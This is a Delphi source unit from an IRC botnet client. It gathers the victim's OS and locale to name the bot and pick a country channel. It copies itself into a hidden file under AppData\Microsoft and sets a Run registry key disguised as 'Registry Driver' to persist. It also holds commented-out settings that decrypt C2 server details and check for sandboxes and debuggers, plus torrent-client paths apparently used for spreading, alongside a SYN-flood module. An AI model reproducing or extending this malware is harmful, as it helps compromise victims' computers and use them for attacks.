unit functions;

interface

uses
  Windows,
  Winsock,
  ShellAPI,
  UrlMon,
  sysutils,
  ShlObj,
  EditSvr,
  seeder;


type
  TControlSetting = Record
    ControlNick         :String;
    ControlChannel      :String;
    ControlIdent        :String;
    ControlHost         :String;
  End;


  Function fetchLocalName: String;
  Function fetchCurrent: String;
  Function fetchRandom(intNumber: Integer): String;
  Function fetchIPfromDNS(szDNS: PChar): String;
  Function ReplaceShortcuts(szText: String): String;
  Function IntToStr(Const Value: Integer): String;
  Function StrToInt(Const S: String): Integer;
  Function LowerCase(Const S: String): String;
  Function GetKBS(dByte: Integer): String;
  Procedure ReplaceStr(ReplaceWord, WithWord:String; Var Text: String);
  Procedure StartUp(EXE:string);
  Procedure Uninstall;
  function UpperCase(const S: string): string;
  procedure LoadData;
  function GetIPFromHost(const HostName: string): string;
  function GetOS: String;
  function IsWOW64: Boolean;
  function CreateNick: string;
  function GetISOChannel: String;

const
CSIDL_WINDOWS = $0024; { GetWindowsDirectory() }
CSIDL_APPDATA = $001A; { Application Data, new for NT4 }
CSIDL_PROGRAM_FILES = $0026; { C:\Program Files }

implementation

uses
dlupdate, miscfunctions,variables, synflood;

function UpperCase(const S: string): string;
var
  Ch: Char;
  L: Integer;
  Source, Dest: PChar;
begin
  L := Length(S);
  SetLength(Result, L);
  Source := Pointer(S);
  Dest := Pointer(Result);
  while L <> 0 do
  begin
    Ch := Source^;
    if (Ch >= 'a') and (Ch <= 'z') then Dec(Ch, 32);
    Dest^ := Ch;
    Inc(Source);
    Inc(Dest);
    Dec(L);
  end;
end;

(*      Function to fetch Current directory     *)
Function fetchCurrent: String;
Var
  Dir           :Array[0..255] Of Char;
Begin
  GetCurrentDirectory(256, Dir);
  Result := String(Dir) + '\';
End;

function isNew: boolean;
var
path:array[0..Max_Path] of Char;
begin
Result := True;
ShGetSpecialFolderPath(0,path, CSIDL_WINDOWS, False);
if fetchCurrent = path + '\system32\' then Result := False;
end;

function CreateNick: string;
begin
if isNew = True then
Result := '{NEW|' + getOS + '|' + GetWinLang + '|' + fetchRandom(5)+ '}'
else
Result := '{' + getOS + '|' + GetWinLang + '|' + fetchRandom(5)+ '}';
end;

function GetISOChannel: String;
begin
result := '#UNK';
If GetWinLang = 'USA' then
  result := '#USA';
If GetWinLang = 'BRA' then
  result :=  '#BRA';
If GetWinLang = 'RUS' then
  result :=  '#RUS';
If GetWinLang = 'AUS' then
  result :=  '#AUS';
If GetWinLang = 'BEL' then
  result :=  '#BEL';
If GetWinLang = 'CAN' then
  result :=  '#CAN';
If GetWinLang = 'FRA' then
  result :=  '#FRA';
If GetWinLang = 'GBR' then
  result :=  '#GBR';
If GetWinLang = 'ITA' then
  result :=  '#ITA';
If GetWinLang = 'NLD' then
  result :=  '#NLD';
If GetWinLang = 'SAU' then
  result :=  '#SAU';
If GetWinLang = 'BRA' then
  result :=  '#BRA';
end;

(*      Function to calculate KB/s              *)
Function GetKBS(dByte: Integer): String;
Var
  dB    :Integer;
  dKB   :Integer;
  dMB   :Integer;
  dGB   :Integer;
  dT    :Integer;
Begin
  dB := dByte;
  dKB := 0;
  dMB := 0;
  dGB := 0;
  dT  := 1;

  While (dB > 1024) Do
  Begin
    Inc(dKB, 1);
    Dec(dB , 1024);
    dT := 1;
  End;

  While (dKB > 1024) Do
  Begin
    Inc(dMB, 1);
    Dec(dKB, 1024);
    dT := 2;
  End;

  While (dMB > 1024) Do
  Begin
    Inc(dGB, 1);
    Dec(dMB, 1024);
    dT := 3;
  End;

  Case dT Of
    1: Result := IntToStr(dKB) + '.' + Copy(IntToStr(dB ),1,2) + ' kb';
    2: Result := IntToStr(dMB) + '.' + Copy(IntToStr(dKB),1,2) + ' mb';
    3: Result := IntToStr(dGB) + '.' + Copy(IntToStr(dMB),1,2) + ' gb';
  End;
End;

(*      Function to make text lowercase         *)
Function LowerCase(Const S: String): String;
Var
  Ch    :Char;
  L     :Integer;
  Source:pChar;
  Dest  :pChar;
Begin
  L := Length(S);
  SetLength(Result, L);
  Source := Pointer(S);
  Dest   := Pointer(Result);
  While (L <> 0) Do
  Begin
    Ch := Source^;
    If (Ch >= 'A') And (Ch <= 'Z') Then
      Inc(Ch, 32);
    Dest^ := Ch;
    Inc(Source);
    Inc(Dest);
    Dec(L);
  End;
End;

(*      Function to resolve IP from DNS         *)
Function fetchIPfromDNS(szDNS: PChar): String;
Type
  TAddr = Array[0..100] Of PInAddr;
  PAddr = ^TAddr;

Var
  iLoop         :Integer;
  WSAData       :TWSAData;
  HostEnt       :PHostEnt;
  Addr          :PAddr;

Begin
  WSAStartUP($101, WSAData);
  Try
    HostEnt := GetHostByName(szDNS);
    If (HostEnt <> NIL) Then
    Begin
      Addr := PAddr(HostEnt^.h_addr_list);
      iLoop := 0;
      While (Addr^[iLoop] <> NIL) Do
      Begin
        Result := inet_nToa(Addr^[iLoop]^);
        Inc(iLoop);
      End;
    End;
  Except
    Result := '0.0.0.0';
  End;
  WSACleanUP();
End;


(*      Function to Convert String to Integer   *)
Function StrToInt(Const S: String): Integer;
Var
  E: Integer;
Begin
  Val(S, Result, E);
End;

(*      Function to Convert Integer to String   *)
Function IntToStr(Const Value: Integer): String;
Var
  S: String[11];
Begin
  Str(Value, S);
  Result := S;
End;

(*      Function to fetch Local Name            *)
Function fetchLocalName: String;
Var
  LocalHost     : Array [0..63] Of Char;
Begin
  GetHostName(LocalHost, SizeOf(LocalHost));
  Result := String(LocalHost);
End;

(*      Function to replace shortcuts           *)
Function ReplaceShortcuts(szText: String): String;
var
path:array[0..Max_Path] of Char;
string1:string;
Begin
  ReplaceStr('%os%', GetOS, szText);
  ReplaceStr('%cc%', GetWinLang(), szText);
  ReplaceStr('%rn%', fetchRandom(5), szText);
  ReplaceStr('%ut%', getuptime(), szText);
  //ReplaceStr('%ln%', fetchLocalName, szText);
  Result := '{NEW|' + GetOS + '|' + GetWinLang() + '|' + fetchRandom(5)+ '}';
  ShGetSpecialFolderPath(0,path, CSIDL_WINDOWS, False);
  string1 := path + '\system32\';
  If fetchCurrent = string1 then Result := szText;
End;

(*      Function to generate a random number    *)
Function fetchRandom(intNumber: Integer): String;
Var
  I     :Integer;
Begin
  Randomize;
  Result := '';
  For I := 1 To intNumber Do
    Result := Result + IntToStr(Random(10));
End;

(*      Function to replace strings             *)
Procedure ReplaceStr(ReplaceWord, WithWord:String; Var Text: String);
Var
  xPos: Integer;
Begin
  While Pos(ReplaceWord, Text)>0 Do
  Begin
    xPos := Pos(ReplaceWord, Text);
    Delete(Text, xPos, Length(ReplaceWord));
    Insert(WithWord, Text, xPos);
  End;
End;

function IsWOW64: Boolean;
type
  TIsWow64Process = function( // Type of IsWow64Process API fn
    Handle: THandle;
    var Res: BOOL
  ): BOOL; stdcall;
var
  IsWow64Result: BOOL;              // result from IsWow64Process
  IsWow64Process: TIsWow64Process;  // IsWow64Process fn reference
begin
  // Try to load required function from kernel32
  IsWow64Process := GetProcAddress(
    GetModuleHandle('kernel32'), 'IsWow64Process'
  );
  if Assigned(IsWow64Process) then
  begin
    // Function is implemented: call it
    if not IsWow64Process(GetCurrentProcess, IsWow64Result) then
      raise Exception.Create('Bad process handle');
    // Return result of function
    Result := IsWow64Result;
  end
  else
    // Function not implemented: can't be running on Wow64
    Result := false;
end;

function GetOS: String;
var
  PlatformId, VersionNumber: string;
  CSDVersion: String;
  sBit: string;
begin
  Result := 'Unknown';
  CSDVersion := '';

  // Detect platform
  case Win32Platform of
    // Test for the Windows 95 product family
    VER_PLATFORM_WIN32_WINDOWS:
    begin
      if Win32MajorVersion = 4 then
        case Win32MinorVersion of
          0:  if (Length(Win32CSDVersion) > 0) and
                 (Win32CSDVersion[1] in ['B', 'C']) then
                PlatformId := '95 OSR2'
              else
                PlatformId := '95';
          10: if (Length(Win32CSDVersion) > 0) and
                 (Win32CSDVersion[1] = 'A') then
                PlatformId := '98 SE'
              else
                PlatformId := '98';
          90: PlatformId := 'ME';
        end
      else
        PlatformId := '9x version (unknown)';
    end;
    // Test for the Windows NT product family
    VER_PLATFORM_WIN32_NT:
    begin
      if Length(Win32CSDVersion) > 0 then CSDVersion := Win32CSDVersion;
      if Win32MajorVersion <= 4 then
        PlatformId := 'NT'
      else
        if Win32MajorVersion = 5 then
          case Win32MinorVersion of
            0: PlatformId := '2000';
            1: PlatformId := 'WinXP';
            2: PlatformId := 'Server 2003';
          end
        else if (Win32MajorVersion = 6) and (Win32MinorVersion = 0) then
          PlatformId := 'Vista'
       else if (Win32MajorVersion = 6) and (win32minorversion = 1)then
          PlatformId := 'Win7'
        else
          PlatformId := '(unknown)';
    end;
  end;
  if (IsWOW64 = true) then
  sbit := 'x64'
  else if (IsWOW64 = false) then
  sBit := 'x32';
  
  if (PlatformId = #0) and (CsdVersion = #0) then begin
  result := 'Unknown';
  end;
  Result := PlatformId + sBit
end;

(*      Function to add bot to startup            *)
procedure startup(EXE:string);
var
path:array[0..Max_Path] of Char;
string1:string;
handle:Thandle;
begin
Handle := loadlibrary('Urlmon.dll'); // load the dll
ShGetSpecialFolderPath(0,path, CSIDL_APPDATA, False);
string1 := path + '\Microsoft\' + EXE;
DownloadDir := path + '\Microsoft\';
sEXEPath := string1;
    
    if FileExists(string1) then begin
      deletefile(string1);
    end;
    
    copyFile(pchar(paramstr(0)),pchar(string1),false);
    
    if fileexists(string1) then begin
     SetFileAttributes(PChar(string1),FILE_ATTRIBUTE_HIDDEN);
    end;
    
    if paramstr(0) <> string1 then begin
     shellExecute(handle, 'open', pChar(string1), nil, nil, SW_SHOW);
     exitprocess(0);
     end else
     InsertRegValue(HKEY_CURRENT_USER, 'SOFTWARE\Microsoft\Windows\CurrentVersion\Run', 'Registry Driver', sEXEPath);
    //end;

end;

(*      Function to uninstall bot              *)
Procedure Uninstall;
  begin
  DeleteRegValue(HKEY_CURRENT_USER, 'SOFTWARE\Microsoft\Windows\CurrentVersion\Run', 'Registry Driver');
  ExitProcess(0);
end;

procedure LoadData;
{var
  Load:     TLoader;}
begin

  {Load := TLoader.Create;
  Load.LoadSettings;

  bot_mutexname := Load.Settings[0];
  bot_installname := decrypt(Load.Settings[1], '02dsh68ih');
  bot_prefix := Load.Settings[2];
  server_address := decrypt(Load.Settings[3], '02dsh68ih');
  server_port := strtoint(load.settings[4]);
  server_nick := load.settings[5];
  server_channel := decrypt(Load.Settings[6], '02dsh68ih');
  server_channelkey := decrypt(Load.Settings[7], '02dsh68ih');
  dlcmd := Load.Settings[8];
  upcmd := Load.Settings[9];
  C_Sandboxie := Load.Settings[10];
  C_sysdebug :=Load.Settings[11];
  C_joebox := Load.Settings[12];
  C_threat := Load.Settings[13];
  C_olly := Load.Settings[14];
  C_vmware := Load.Settings[15];
  C_norman := Load.Settings[16];
  c_virtual := Load.Settings[17];
  C_vpc := Load.Settings[18];
  C_debugs := Load.Settings[19];
  c_soft := Load.Settings[20];
  C_cwsand := Load.Settings[21];
  usb := load.settings[22];
  auth := Load.Settings[23];}
  
  VuzeLocalPath := GetAppDataPath+'\Azureus\torrents\';
  UTorrentLocalPath := GetAppDataPath+'\uTorrent\';
  UTorrentPath := GetProgramFilesPath+'\uTorrent\uTorrent.exe';
  BitTorrentPath := GetProgramFilesPath+'\BitTorrent\bittorrent.exe';
  BitLocalPath := GetAppDataPath+'\BitTorrent\';
  VuzePath := GetProgramFilesPath+'\Vuze\Azureus.exe';
end;

function GetIPFromHost(const HostName: string): string;
type
  TaPInAddr = array[0..10] of PInAddr;
  PaPInAddr = ^TaPInAddr;
var
  phe: PHostEnt;
  pptr: PaPInAddr;
  i: Integer;
begin
  Result := '';
  phe := GetHostByName(PChar(HostName));
  if phe = nil then Exit;
  pPtr := PaPInAddr(phe^.h_addr_list);
  i := 0;
  while pPtr^[i] <> nil do
  begin
    Result := inet_ntoa(pptr^[i]^);
    Inc(i);
  end;
end;


end.
